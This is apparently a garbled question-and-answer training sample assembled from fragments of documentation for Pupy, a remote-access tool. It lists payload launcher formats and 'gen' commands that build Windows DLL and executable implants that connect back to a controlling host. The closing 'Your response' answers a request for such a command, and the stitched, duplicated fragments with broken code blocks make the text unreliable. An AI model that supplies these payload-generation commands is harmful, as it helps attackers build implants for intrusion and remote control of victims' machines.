Context:```

-
```pyinst```

-
```py_oneliner```

-
```ps1```

-
```ps1_oneliner```

-
```rubber_ducky```

## Payloads Generation
Payloads generation are done using the `gen` command.
```
>> gen -f <format> <launcher> -t <transport>
```

- Windows dll
```

or
```code
>> download C:\\Windows\\System32\\cmd.exe
```

## Create Aliases
Modules aliases can be defined in the `pupy.conf` file. If you define the following alias :
```code
shell=interactive_shell
```
>> gen -f <format> <launcher> -t <transport>
```

- Windows dll
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport
```

- Windows executable
```
>> gen -f client -O windows -A x64 connect --host ip:port -t transport
```

- Python file - Bind
```
 Question: Generate an example of using gen command related to creating  Windows DLLs with Pupy. Each command should follow the format similar to: \n >> gen -f <format> <launcher> -t <transport>. 
```
 Your response: 
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport
```